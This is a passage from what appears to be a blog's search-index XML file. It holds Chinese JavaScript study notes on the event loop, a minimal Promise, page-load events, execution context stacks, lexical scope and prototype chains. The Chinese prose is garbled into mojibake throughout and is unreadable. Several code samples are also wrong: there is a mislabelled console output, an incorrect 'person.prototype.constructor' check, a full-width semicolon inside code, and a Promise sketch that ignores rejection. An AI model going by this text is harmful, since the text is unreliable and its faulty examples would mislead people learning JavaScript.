å…¥ä»»åŠ¡é˜Ÿåˆ—çš„é˜Ÿå°¾ï¼Œç­‰å¾… JS å¼•æ“Žçº¿ç¨‹çš„æ‰§è¡Œã€‚ å®šæ—¶å™¨è§¦å‘çº¿ç¨‹ è´Ÿè´£æ‰§è¡Œå¼‚æ­¥å®šæ—¶å™¨ä¸€ç±»çš„çº¿ç¨‹ï¼Œå¦‚ setTimeout ï¼ŒsetInterval ä¸»çº¿ç¨‹å°†ä¾æ¬¡æ‰§è¡Œä»£ç æ—¶ï¼Œé‡åˆ°å®šæ—¶å™¨ï¼Œä¼šå°†å®šæ—¶å™¨äº¤ç»™è¯¥çº¿ç¨‹å¤„ç†ï¼Œå½“è®¡æ•°å®Œæ¯•åŽï¼Œäº‹ä»¶è§¦å‘çº¿ç¨‹ä¼šå°†è®¡æ•°å®Œæ¯•åŽçš„äº‹ä»¶åŠ å…¥åˆ°ä»»åŠ¡é˜Ÿåˆ—çš„å°¾éƒ¨ï¼Œç­‰ JS å¼•æ“Žçº¿ç¨‹æ‰§è¡Œ HTTP è¯·æ±‚çº¿ç¨‹ è´Ÿè´£æ‰§è¡Œå¼‚æ­¥è¯·æ±‚ä¸€ç±»çš„å‡½æ•°è¯·æ±‚ï¼Œå¦‚ Promiseã€axiosã€ajax ç­‰ ä¸»çº¿ç¨‹ä¸€æ¬¡æ‰§è¡Œä»£ç ï¼Œé‡åˆ°å¼‚æ­¥è¯·æ±‚ï¼Œä¼šå°†å‡½æ•°äº¤ç»™è¯¥çº¿ç¨‹å¤„ç†ï¼Œå½“ç›‘å¬åˆ°çŠ¶æ€ç çš„æ”¹å˜ï¼Œå¦‚æžœæœ‰å›žè°ƒå‡½æ•°ï¼Œäº‹ä»¶è§¦å‘çº¿ç¨‹ä¼šå°†å›žè°ƒå‡½æ•°åŠ å…¥åˆ°ä»»åŠ¡é˜Ÿåˆ—çš„å°¾éƒ¨ï¼Œç­‰å¾… JS å¼•æ“Žçº¿ç¨‹æ‰§è¡Œ Render è¿›ç¨‹ æµè§ˆå™¨æ¸²æŸ“è¿›ç¨‹ï¼ˆæµè§ˆå™¨å†…æ ¸ï¼‰ï¼Œä¸»è¦è´Ÿè´£é¡µé¢çš„æ¸²æŸ“ã€JS æ‰§è¡Œä»¥åŠäº‹ä»¶çš„å¾ªçŽ¯ã€‚ JS å®žçŽ°ä¸€ä¸ªç®€å•çš„ Promise12345678910111213141516171819202122232425262728293031323334353637383940414243444546const PENDING = 0;const RESOLVED = 1;const REJECTED = 2;function myPromise(func)&#123; // ä¿å­˜ çŠ¶æ€ï¼ˆPENDING|FULFILLED|REJECTED ï¼‰ let state = PENDING; // ä¿å­˜ å®ŒæˆåŽçš„å€¼æˆ–è€…å¤±è´¥åŽçš„é”™è¯¯ let value = null; // ä¿å­˜ è°ƒç”¨æˆåŠŸåŽçš„å›žè°ƒæˆ–è€…å¤±è´¥çš„å›žè°ƒ let handlers = []; function resolve(newValue)&#123; if(newValue &amp;&amp; (typeof newValue === 'object' || typeof newValue === 'function'))&#123; let then = newValue.then; if(typeof then === 'function')&#123; return then.call(newValue,resolve); &#125; &#125; value = newValue; state = RESOLVED; setTimeout(()=&gt;&#123; handlers.forEach(handler =&gt; handle(handler)); &#125;,0) &#125; function reject(err)&#123; value = err; state = REJECTED; &#125; function handle(handler)&#123; if(state === PENDING)&#123; handlers.push(handler); return; &#125; // console.log(handler.onFullFill); // console.log(value); handler.resolve(handler.onFullFill(value)); &#125; this.then = function(onFullFill,onReject)&#123; return new myPromise((resolve,reject) =&gt;&#123; handle(&#123; resolve:resolve, onFullFill:onFullFill &#125;) &#125;) &#125; func(resolve,reject);&#125; window.onload å’Œ document.onDOMContentLoaded æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿå…·ä½“æ–‡æ¡£load DOMContentLoaded-MDN æ¦‚æ‹¬onload äº‹ä»¶æ˜¯ DOM äº‹ä»¶ï¼Œè€Œ onDOMContentLoaded æ˜¯ HTML5 äº‹ä»¶ onload äº‹ä»¶ä¼šè¢«æ ·å¼è¡¨ã€å›¾åƒå’Œè‡ªæ¡†æž¶é˜»å¡žï¼Œè€Œ onDOMContentLoaded äº‹ä»¶ä¸ä¼šã€‚ å½“åŠ è½½çš„è„šæœ¬å†…å®¹å¹¶ä¸åŒ…å«ç«‹å³æ‰§è¡ŒDOM æ“ä½œçš„æ—¶å€™ï¼Œä½¿ç”¨ onDOMContentLoaded äº‹ä»¶æ˜¯ä¸ªæ›´å¥½çš„é€‰æ‹©ï¼Œä¼šæ¯” onload äº‹ä»¶æ‰§è¡Œæ—¶é—´æ›´æ—© åˆ›å»º10ä¸ªæ ‡ç­¾ï¼Œå¹¶å¼¹å‡ºå¯¹åº”çš„åºå·12345678910for (var i = 0; i &lt; 10; i++) &#123; (function (i) &#123; var a = document.createElement('a'); a.innerHTML = i+'&lt;br/&gt;'; a.addEventListener('click', function (e) &#123; console.log(i) &#125;); document.body.appendChild(a); &#125;)(i)&#125; CSS ä¸Ž JS çš„é˜»å¡žé—®é¢˜ CSS ä¸ä¼šé˜»å¡ž DOM çš„è§£æžã€‚ä½†æ˜¯ä¼šé˜»å¡ž DOM çš„æ¸²æŸ“ JS é˜»å¡ž DOM è§£æžï¼Œä½†æ˜¯æµè§ˆå™¨ä¼š â€œå·çœ‹â€ DOM,é¢„å…ˆä¸‹è½½ç›¸å…³èµ„æº æµè§ˆå™¨é‡åˆ° scriptä¸”æ²¡æœ‰ deferæˆ–è€… asyncå±žæ€§çš„æ ‡ç­¾çš„æ—¶å€™ï¼Œä¼šè§¦å‘é¡µé¢æ¸²æŸ“ï¼Œæ‰€æœ‰å¦‚æžœå‰é¢ CSSèµ„æºè¿˜æ²¡æœ‰åŠ è½½å®Œæ¯•æ—¶ï¼Œæµè§ˆå™¨ä¼šç­‰å¾…å®ƒåŠ è½½å®Œæ¯•å†æ‰§è¡Œè„šæœ¬ã€‚ scriptæœ€å¥½æ”¾åº•éƒ¨ï¼Œ linkæ”¾å¤´éƒ¨ï¼Œå¦‚æžœå¤´éƒ¨åŒæ—¶æ‹¥æœ‰è¿™ä¸¤ä¸ªï¼Œscriptæœ€å¥½æ”¾åœ¨linkå‰é¢ å‚è€ƒé“¾æŽ¥ï¼š JSç±»åž‹è½¬æ¢(å¼ºåˆ¶å’Œè‡ªåŠ¨çš„è§„åˆ™) JavaScript æ•°æ®ç±»åž‹è½¬æ¢ï¼ˆæ˜¾å¼ä¸Žéšå¼ï¼‰ DOMæ ‡å‡†ä¸ŽIEçš„htmlå…ƒç´ äº‹ä»¶æ¨¡åž‹åŒºåˆ« ieå’Œdomäº‹ä»¶æµçš„åŒºåˆ« å‰ç«¯é¢è¯•é¢˜â€”â€”callä¸Žapplyæ–¹æ³•çš„å¼‚åŒ JavaScriptä¸­Bç»§æ‰¿Açš„æ–¹æ³•Meä¸¶å¾®ç¬‘ Javascript ä¸­ ä½œç”¨åŸŸã€é—­åŒ…ä¸Ž thisæŒ‡é’ˆ ç†è§£JAVASCRIPTçš„é—­åŒ… æ·±å…¥ç†è§£JSä¸­çš„å˜é‡ä½œç”¨åŸŸ è§£å†³jså‡½æ•°é—­åŒ…å†…å­˜æ³„éœ²é—®é¢˜çš„åŠžæ³• jsä¸­çš„äº‹ä»¶å§”æ‰˜æˆ–æ˜¯äº‹ä»¶ä»£ç†è¯¦è§£ JavaScriptæ•èŽ·å’Œå†’æ³¡æŽ¢è®¨ JSé˜»æ­¢å†’æ³¡å’Œå–æ¶ˆé»˜è®¤äº‹ä»¶(é»˜è®¤è¡Œä¸º) javascriptåŽŸç”Ÿæ–¹æ³•å¯¹domèŠ‚ç‚¹çš„æ“ä½œï¼Œåˆ›å»ºã€æ·»åŠ ã€åˆ é™¤ã€æ›¿æ¢ã€æ’å…¥ã€å¤åˆ¶ã€ç§»åŠ¨ç­‰æ“ä½œ JavaScriptä¸­æœ¬åœ°å¯¹è±¡ã€å†…ç½®å¯¹è±¡å’Œå®¿ä¸»å¯¹è±¡ jsä¸­==å’Œ===åŒºåˆ« åŒæºç­–ç•¥ä¸ŽJSè·¨åŸŸè¯·æ±‚(å›¾æ–‡å®žä¾‹è¯¦è§£) Jsæ•°ç»„åŽ»é‡æ–¹æ³•æ€»ç»“ javascript å…­ç§æ•°æ®ç±»åž‹ï¼ˆä¸€ï¼‰ Javascriptæ­£åˆ™æž„é€ å‡½æ•°ä¸Žæ­£åˆ™è¡¨è¾¾å­—é¢é‡&amp;&amp;å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼ jsä¸­çš„callerä¸Žcalleeç”¨æ³•å°å®žä¾‹ callerå’Œcalleeçš„åŒºåˆ« äº‹ä»¶å¾ªçŽ¯æœºåˆ¶çš„é‚£äº›äº‹ åå‡ è¡Œä»£ç æ•™ä½ å®žçŽ°ä¸€ä¸ªæœ€ç®€ç‰ˆçš„promise window.onload å’Œ document.onDOMContentLoaded æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ åŽŸæ¥ CSS ä¸Ž JS æ˜¯è¿™æ ·é˜»å¡ž DOM è§£æžå’Œæ¸²æŸ“çš„]]></content>
      <categories>
        <category>å‰ç«¯é¢è¯•</category>
      </categories>
      <tags>
        <tag>å‰ç«¯é¢è¯•é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥JavaScriptâ€”â€” æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆ]]></title>
    <url>%2F2019-01-12-%E6%B7%B1%E5%85%A5JavaScript%E2%80%94%E2%80%94%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E6%A0%88.html</url>
    <content type="text"><![CDATA[ç»ä¸€äº›çƒ­å¿ƒç½‘å‹æŽ¨èï¼Œçœ‹åˆ°äº†å†´ç¾½ çš„æ·±å…¥ç³»åˆ—ï¼ŒçŽ°åšå­¦ä¹ ä¸Žè®°å½•ï¼Œå¸Œæœ›å¯ä»¥æ¯å¤©å­¦ä¹ ä¸€ç¯‡ï¼ŒåŠ å¼ºå·©å›ºè‡ªå·±å¯¹äºŽ js çš„ç†è§£ã€‚åŽŸä»“åº“åœ°å€ã€‚ JavaScriptæ·±å…¥ä¹‹æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆé¡ºåºæ‰§è¡Œä¸¾ä¸ªä¾‹å­ï¼š 12345678var foo = function()&#123; console.log('foo1');&#125;foo(); // foo1var foo = function()&#123; console.log('foo2');&#125;foo(); // foo2 å¦ä¸€ä¸ªä¾‹å­ï¼š 123456789var foo = function()&#123; console.log('foo1');&#125;foo(); // foo2function foo()&#123; console.log('foo2');&#125;foo(); // foo2 JavaScript å¼•æ“Žå¹¶éžä¸€è¡Œä¸€è¡Œåœ°åˆ†æžå’Œæ‰§è¡Œç¨‹åºçš„ï¼Œè€Œæ˜¯ä¸€æ®µä¸€æ®µåˆ†æžæ‰§è¡Œã€‚å½“æ‰§è¡Œä¸€æ®µä»£ç çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œä¸€ä¸ªâ€œå‡†å¤‡å·¥ä½œâ€ã€‚æ¯”å¦‚ç¬¬ä¸€ä¸ªä¾‹å­ä¸­çš„ï¼Œå˜é‡æå‡ã€‚å’Œç¬¬äºŒä¸ªä¾‹å­ä¸­çš„å‡½æ•°æå‡ã€‚ å¯æ‰§è¡Œä»£ç åˆ†ä¸ºä¸‰ç§ï¼šå…¨å±€ä»£ç ã€å‡½æ•°ä»£ç å’Œ eval ä»£ç  ä¸¾ä¸ªä¾‹å­ã€‚å½“æ‰§è¡Œåˆ°ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œå‡†å¤‡å·¥ä½œï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»å¸¸å¬åˆ°çš„ â€œæ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆexecution contextï¼‰â€ æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆJavaScript å¼•æ“Žåˆ›å»ºäº†æ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆExecution context stack,ECSï¼‰æ¥ç®¡ç†æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œä¸ºäº†æ¨¡æ‹Ÿæ‰§è¡Œä¸Šä¸‹æ–‡æ ˆçš„è¡Œä¸ºï¼Œè®©æˆ‘ä»¬å®šä¹‰æ‰§è¡Œä¸Šä¸‹æ–‡æ˜¯ä¸€ä¸ªæ•°ç»„ï¼š 1ECStack = []; å½“ JavaScript å¼€å§‹è¦è§£é‡Šæ‰§è¡Œä»£ç çš„æ—¶å€™ï¼Œæœ€å…ˆé‡åˆ°çš„æ˜¯å…¨å±€ä»£ç ï¼Œæ‰€ä»¥åˆå§‹åŒ–çš„æ—¶å€™ä¼šé¦–å…ˆå‘æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆåŽ‹å¦‚ä¸€ä¸ªå…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œæˆ‘ä»¬ç”¨ globalContext è¡¨ç¤ºå®ƒï¼Œå¹¶ä¸”åªæœ‰å½“æ•´ä¸ªåº”ç”¨ç¨‹åºç»“æŸçš„æ—¶å€™ï¼ŒECStack æ‰ä¼šè¢«æ¸…ç©ºï¼Œæ‰€ä»¥å½“ç¨‹åºç»“æŸä¹‹å‰ï¼ŒECStack æœ€åº•éƒ¨æ°¸è¿œæœ‰ä¸€ä¸ª globalContextï¼š 123ECStack = [ globalContext] çŽ°åœ¨ JavaScript é‡åˆ°ä¸‹é¢è¿™æ®µä»£ç ï¼š 12345678910function func3()&#123; console.log('func3');&#125;function func2()&#123; func3();&#125;function func1()&#123; func2();&#125;func1(); å½“æ‰§è¡Œä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”åŽ‹å…¥æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆï¼Œå½“å‡½æ•°æ‰§è¡Œå®Œæ¯•çš„æ—¶å€™ï¼Œå°±ä¼šå°†å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ä»Žæ ˆä¸­å¼¹å‡ºï¼ŒçŸ¥é“äº†è¿™æ ·çš„å·¥ä½œåŽŸç†ä¹‹åŽï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•å¤„ç†ä¸Šé¢è¿™æ®µä»£ç ï¼š 1234567891011121314151617181920// ä¼ªä»£ç // func1()ECStack.push(&lt;func1&gt; functionContext);// func1 ä¸­ç«Ÿç„¶è°ƒç”¨äº† func2ï¼Œè¿˜è¦åˆ›å»º func2 çš„æ‰§è¡Œä¸Šä¸‹æ–‡ECStack.push(&lt;func2&gt; functionContext);// func2 è¿˜è°ƒç”¨äº†func3ECStack.push(&lt;func3&gt; functionContext);// func3 æ‰§è¡Œå®Œæ¯•ECStack.pop();// func2 æ‰§è¡Œå®Œæ¯•ECStack.pop();// func1 æ‰§è¡Œå®Œæ¯•ECStack.pop();// javascript æŽ¥ç€æ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼Œä½†æ˜¯ ECStack åº•å±‚æ°¸è¿œæœ‰ä¸ª globalContext è§£ç­”æ€è€ƒé¢˜123456789101112131415161718function checkscope()&#123; var scope = "local scope"; function f()&#123; return scope; &#125; return f();&#125;checkscope();var scope = "global scope";function checkscope()&#123; var scope = "local scope" function f()&#123; return scope; &#125; return f;&#125;checkscope()(); ä¸¤æ®µä»£ç ä¸ä¸€æ ·çš„åœ°æ–¹ä¸»è¦ä½“çŽ°åœ¨æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆçš„ä¸ä¸€æ · æ¨¡æ‹Ÿç¬¬ä¸€æ®µä»£ç ï¼š 1234ECStack.push(&lt;checkscope&gt; functionContext)ECStack.push(&lt;f&gt; functionContext)ECStack.pop();ECStack.pop(); æ¨¡æ‹Ÿç¬¬äºŒæ®µä»£ç ï¼š 1234ECStack.push(&lt;checkscope&gt; functionContext)ECStack.pop();ECStack.push(&lt;f&gt; functionContext)ECStack.pop();]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>æ·±å…¥JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥JavaScriptâ€”â€” ä½œç”¨åŸŸä¸ŽåŠ¨æ€ä½œç”¨åŸŸ]]></title>
    <url>%2F2019-01-11-%E6%B7%B1%E5%85%A5JavaScript%E2%80%94%E2%80%94%E4%BD%9C%E7%94%A8%E5%9F%9F%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BD%9C%E7%94%A8%E5%9F%9F.html</url>
    <content type="text"><![CDATA[ç»ä¸€äº›çƒ­å¿ƒç½‘å‹æŽ¨èï¼Œçœ‹åˆ°äº†å†´ç¾½ çš„æ·±å…¥ç³»åˆ—ï¼ŒçŽ°åšå­¦ä¹ ä¸Žè®°å½•ï¼Œå¸Œæœ›å¯ä»¥æ¯å¤©å­¦ä¹ ä¸€ç¯‡ï¼ŒåŠ å¼ºå·©å›ºè‡ªå·±å¯¹äºŽ js çš„ç†è§£ã€‚åŽŸä»“åº“åœ°å€ã€‚ JavaScriptæ·±å…¥ä¹‹è¯æ³•ä½œç”¨åŸŸå’ŒåŠ¨æ€ä½œç”¨åŸŸä½œç”¨åŸŸä½œç”¨åŸŸæ˜¯æŒ‡ç¨‹åºæºä»£ç ä¸­å®šä¹‰å˜é‡çš„åŒºåŸŸã€‚ ä½œç”¨åŸŸè§„å®šäº†å¦‚ä½•æŸ¥æ‰¾å˜é‡ï¼Œä¹Ÿå°±æ˜¯ç¡®å®šå½“å‰æ‰§è¡Œä»£ç å¯¹å˜é‡çš„è®¿é—®æƒé™ã€‚ JavaScript é‡‡ç”¨è¯æ³•ä½œç”¨åŸŸï¼ˆlexical scopingï¼‰ï¼Œä¹Ÿå°±æ˜¯é™æ€ä½œç”¨åŸŸã€‚ é™æ€ä½œç”¨åŸŸä¸ŽåŠ¨æ€ä½œç”¨åŸŸå› ä¸º JavaScript é‡‡ç”¨çš„æ˜¯è¯æ³•ä½œç”¨åŸŸï¼Œå‡½æ•°çš„ä½œç”¨åŸŸåœ¨å‡½æ•°å®šä¹‰çš„æ—¶å€™å°±å†³å®šäº†ã€‚è€Œä¸Žè¯æ³•ä½œç”¨åŸŸç›¸å¯¹çš„æ˜¯åŠ¨æ€ä½œç”¨åŸŸï¼Œå‡½æ•°çš„ä½œç”¨åŸŸæ˜¯åœ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™æ‰å†³å®šçš„ã€‚ä¸‹é¢ä¸¾ä¸ªä¾‹å­ 1234567891011var value = 1;function foo()&#123; console.log(value);&#125;function bar()&#123; var value = 2; foo();&#125;bar(); // ç»“æžœæ˜¯ä»€ä¹ˆï¼Ÿ å‡è®¾ JavaScript é‡‡ç”¨é™æ€ä½œç”¨åŸŸï¼Œè®©æˆ‘ä»¬åˆ†æžä¸€ä¸‹æ‰§è¡Œè¿‡ç¨‹ï¼š æ‰§è¡Œ foo å‡½æ•°ï¼Œå…ˆä»Ž foo å‡½æ•°å†…éƒ¨æŸ¥æ‰¾æ˜¯å¦æœ‰å±€éƒ¨å˜é‡ value,å¦‚æžœæ²¡æœ‰ï¼Œå°±æ ¹æ®ä¹¦å†™çš„ä½ç½®ï¼ŒæŸ¥æ‰¾ä¸Šä¸€å±‚çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯ value ç­‰äºŽ 1ï¼Œæ‰€ä»¥ç»“æžœä¼šæ‰“å° 1. å‡è®¾ JavaScript é‡‡ç”¨çš„æ˜¯åŠ¨æ€ä½œç”¨åŸŸï¼Œè®©æˆ‘ä»¬åˆ†æžä»¥ä¸‹æ‰§è¡Œè¿‡ç¨‹ï¼š æ‰§è¡Œ foo å‡½æ•°ï¼Œä¾ç„¶æ˜¯ä»Ž foo å‡½æ•°å†…éƒ¨æŸ¥æ‰¾æ˜¯å¦æœ‰å±€éƒ¨å˜é‡ value,å¦‚æžœæ²¡æœ‰ï¼Œå°±ä»Žè°ƒç”¨å‡½æ•°çš„ä½œç”¨åŸŸï¼Œä¹Ÿå°±æ˜¯ä»Ž bar å‡½æ•°å†…éƒ¨æŸ¥æ‰¾ value å˜é‡ï¼Œæ‰€ä»¥æ‰“å°ç»“æžœæ˜¯ 2. å‰é¢æˆ‘ä»¬è¯´äº†ï¼ŒJavaScript é‡‡ç”¨çš„æ˜¯ é™æ€ä½œç”¨åŸŸï¼Œæ‰€ä»¥è¿™é‡Œçš„æ‰“å°ç»“æžœæ˜¯ 1. åŠ¨æ€ä½œç”¨åŸŸbash å°±æ˜¯åŠ¨æ€ä½œç”¨åŸŸ æ€è€ƒé¢˜çœ‹ä¸€ä¸ª ã€ŠJavaScript æƒå¨æŒ‡å—ã€‹ çš„ä¾‹å­ 12345678910111213141516171819function checkscope()&#123; var scope = "local scope"; function f()&#123; return scope; &#125; return f();&#125;checkscope();var scope = "global scope";function checkscope()&#123; var scope = "local scope" function f()&#123; return scope; &#125; return f;&#125;checkscope()(); ä¸¤æ®µä»£ç æ‰“å°å‡ºæ¥çš„éƒ½æ˜¯ï¼šlocal scope ï¼Œå› ä¸º JavaScript é‡‡ç”¨çš„æ˜¯è¯æ³•ä½œç”¨åŸŸ ï¼Œå‡½æ•°çš„ä½œç”¨åŸŸåŸºäºŽå‡½æ•°åˆ›å»ºçš„ä½ç½®ã€‚ JavaScript å‡½æ•°çš„æ‰§è¡Œç”¨åˆ°äº†ä½œç”¨åŸŸé“¾ï¼Œè¿™ä¸ªä½œç”¨åŸŸé“¾æ˜¯åœ¨å‡½æ•°å®šä¹‰çš„æ—¶å€™åˆ›å»ºçš„ã€‚åµŒå¥—åœ¨å‡½æ•° fï¼ˆï¼‰å®šä¹‰åœ¨è¿™ä¸ªä½œç”¨åŸŸé“¾é‡Œï¼Œå…¶ä¸­çš„å˜é‡ scope ä¸€å®šæ˜¯å±€éƒ¨å˜é‡ï¼Œä¸ç®¡ä½•æ—¶ä½•åœ°æ‰§è¡Œå‡½æ•° fï¼ˆï¼‰,è¿™ç§ç»‘å®šåœ¨æ‰§è¡Œ fï¼ˆï¼‰æ—¶ä¾ç„¶æœ‰æ•ˆã€‚]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>æ·±å…¥JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥JavaScriptâ€”â€”ä»ŽåŽŸåž‹åˆ°åŽŸåž‹é“¾]]></title>
    <url>%2F2019-01-10-%E6%B7%B1%E5%85%A5JavaScript%E2%80%94%E2%80%94%E4%BB%8E%E5%8E%9F%E5%9E%8B%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%93%BE.html</url>
    <content type="text"><![CDATA[ç»ä¸€äº›çƒ­å¿ƒç½‘å‹æŽ¨èï¼Œçœ‹åˆ°äº†å†´ç¾½ çš„æ·±å…¥ç³»åˆ—ï¼ŒçŽ°åšå­¦ä¹ ä¸Žè®°å½•ï¼Œå¸Œæœ›å¯ä»¥æ¯å¤©å­¦ä¹ ä¸€ç¯‡ï¼ŒåŠ å¼ºå·©å›ºè‡ªå·±å¯¹äºŽ js çš„ç†è§£ã€‚åŽŸä»“åº“åœ°å€ã€‚ JavaScriptæ·±å…¥ä¹‹ä»ŽåŽŸåž‹åˆ°åŽŸåž‹é“¾æž„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡1234function Person()&#123;&#125;var person = new Person();person.name = 'K';console.log(person.name); 'K' åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒPerson å°±æ˜¯ä¸€ä¸ªæž„é€ å‡½æ•°ï¼Œæˆ‘ä»¬ä½¿ç”¨ new åˆ›å»ºäº†ä¸€ä¸ªå®žä¾‹å¯¹è±¡ personã€‚ prototypeæ¯ä¸ªå‡½æ•°éƒ½æ˜¯ä¸€ä¸ª prototypeå±žæ€§ï¼Œè€Œä¸” prototypeæ˜¯å‡½æ•°æ‰æœ‰çš„å±žæ€§ã€‚ä¾‹å¦‚ï¼š 123456function Person()&#123;&#125;Person.prototype.name = 'K';var person1 = new Person();var person2 = new Person()ï¼›console.log(person1.name); // Kconsole.log(person2.name) // K é‚£è¿™ä¸ªå‡½æ•°çš„ prototype å±žæ€§çš„æŒ‡å‘æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯è¿™ä¸ªå‡½æ•°çš„åŽŸåž‹å—ï¼Ÿ å…¶å®žï¼Œå‡½æ•°çš„ prototype å±žæ€§æŒ‡å‘äº†ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ­£æ˜¯è°ƒç”¨è¯¥æž„é€ å‡½æ•°è€Œåˆ›å»ºçš„å®žä¾‹çš„åŽŸåž‹ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªä¾‹å­ä¸­çš„ person1 å’Œ person2 çš„åŽŸåž‹ã€‚åŽŸåž‹æŒ‡çš„æ˜¯æ¯ä¸ª JavaScript å¯¹è±¡ï¼ˆnullé™¤å¤–ï¼‰åœ¨åˆ›å»ºçš„æ—¶å€™ä¼šä¸Žä¹‹å…³è”å¦ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯æˆ‘ä»¬è¯´çš„åŽŸåž‹ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éƒ½ä¼šä»ŽåŽŸåž‹â€œç»§æ‰¿â€å±žæ€§ã€‚ 123 prototype Person --------------- Person.prototype(æž„é€ å‡½æ•°) (å®žä¾‹åŽŸåž‹) ä¸Šé¢ä¸­ï¼Œç”¨ Object.prototype è¡¨ç¤ºå®žä¾‹åŽŸåž‹ é‚£ä¹ˆå®žä¾‹ä¸Žå®žä¾‹åŽŸåž‹ï¼Œä¹Ÿå°±æ˜¯ person å’Œ Person.prototype ä¹‹é—´æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦è¯´åˆ°ç¬¬äºŒä¸ªå±žæ€§ __proto__è¿™ä¸ªæ¯ä¸€ä¸ª JavaScriptå¯¹è±¡(é™¤äº†null)éƒ½å…·æœ‰çš„ä¸€ä¸ªå±žæ€§ï¼Œå«åš __proto__ï¼Œè¿™ä¸ªå±žæ€§ä¼šæŒ‡å‘è¯¥å¯¹è±¡çš„åŽŸåž‹ã€‚ 123function Person()&#123;&#125;var person = new Person();console.log(person.__proto__ === Person.prototype); //true æ›´æ–°å…³ç³»å›¾ï¼š æ—¢ç„¶å®žä¾‹å¯¹è±¡å’Œæž„é€ å‡½æ•°éƒ½å¯ä»¥æŒ‡å‘åŽŸåž‹ï¼Œé‚£ä¹ˆåŽŸåž‹æ˜¯å¦æœ‰å±žæ€§æŒ‡å‘æž„é€ å‡½æ•°æˆ–è€…å®žä¾‹å‘¢ï¼Ÿ constructoræŒ‡å‘å®žä¾‹æ˜¯æ²¡æœ‰çš„ï¼Œå› ä¸ºä¸€ä¸ªæž„é€ å‡½æ•°å¯ä»¥ç”Ÿæˆå¤šä¸ªå®žä¾‹ï¼Œä½†æ˜¯åŽŸåž‹æŒ‡å‘æž„é€ å‡½æ•°å€’æ˜¯æœ‰çš„ã€‚æ¯ä¸ªåŽŸåž‹éƒ½æœ‰ä¸€ä¸ª constructor å±žæ€§æŒ‡å‘å…³è”çš„æž„é€ å‡½æ•°ã€‚ 12function Person()&#123;&#125;console.log(Person === Person.prototype.constructor); // true æ›´æ–°å…³ç³»å›¾ï¼š 123456function Person()&#123;&#125;var person = new Person();person.__proto__ === Person.prototype;person.prototype.constructor === Person;// èŽ·å–å¯¹è±¡åŽŸåž‹çš„æ–¹æ³•Object.getPrototypeOf(person) === Person.prototype; å®žä¾‹ä¸ŽåŽŸåž‹å½“è¯»å–å®žä¾‹çš„å±žæ€§ï¼Œå¦‚æžœæ‰¾ä¸åˆ°ï¼Œå°±ä¼šæŸ¥æ‰¾å¯¹è±¡å…³è”çš„åŽŸåž‹ä¸­çš„å±žæ€§ï¼Œå¦‚æžœè¿˜æŸ¥ä¸åˆ°ã€‚å°±åŽ»æ‰¾åŽŸåž‹çš„åŽŸåž‹ï¼Œä¸€ç›´æ‰¾åˆ°æœ€é¡¶å±‚ä½ç½®ã€‚ ä¸¾ä¸ªä¾‹å­ 1234567function Person() &#123;&#125;Person.prototype.name = 'K';var person = new Person();person.name = 'D';person.name; // 'D'delete person.name;person.name // 'K' ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ç»™å®žä¾‹å¯¹è±¡ person æ·»åŠ äº† name å±žæ€§ï¼Œå½“æˆ‘ä»¬æ‰“å° person.name çš„æ—¶å€™ï¼Œç»“æžœè‡ªç„¶æ˜¯ Dï¼Œä½†æ˜¯å½“æˆ‘ä»¬åˆ é™¤äº† person çš„ name å±žæ€§åŽã€‚è¯»å– person.name ï¼Œä»Ž person å¯¹è±¡ä¸­æ‰¾ä¸åˆ° name å±žæ€§å°±ä¼šä»Ž person çš„åŽŸåž‹ï¼Œä¹Ÿå°±æ˜¯ person.__proto__,ä¹Ÿå°±æ˜¯ Person.prototype ä¸­æŸ¥æ‰¾ï¼Œæ‰¾åˆ°äº† Kã€‚ ä½†æ˜¯ä¸‡ä¸€æ²¡æœ‰æ‰¾åˆ°å‘¢ï¼Œé‚£ä¹ˆåŽŸåž‹çš„åŽŸåž‹åˆæ˜¯ä»€ä¹ˆï¼Ÿ 